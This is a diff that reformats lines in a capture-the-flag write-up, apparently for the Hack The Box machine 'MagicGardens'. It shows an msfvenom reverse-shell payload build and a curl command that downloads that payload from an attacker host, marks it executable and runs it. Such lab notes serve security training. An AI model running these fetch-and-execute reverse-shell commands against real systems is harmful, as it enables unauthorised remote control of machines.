@@ -22,7 +22,8 @@ NMAP
 Add magicgardens.htb to /etc/hosts
 
 - **<u>Port 80:</u>**
-<http://magicgardens.htb/admin/login/?next=/admin/>
+
+`http://magicgardens.htb/admin/login/?next=/admin/`
 
 
 ![image3](../resources/1090b253fea2428fa3c302e545ce0023.png)
@@ -297,7 +298,8 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.82 LPORT=9001 -f elf -o r
 - Setup listener
 
 - Add line to exploit.py file:
-curl <http://10.10.14.82:8001/reverse.elf> -o /tmp/rev.elf && chmod +x /tmp/rev.elf && /tmp/rev.elf
+
+`curl http://10.10.14.82:8001/reverse.elf -o /tmp/rev.elf && chmod +x /tmp/rev.elf && /tmp/rev.elf`
 
 
 ![image44](../resources/c0f6f7d3de5d46d4b53ec8a6083a1711.png)
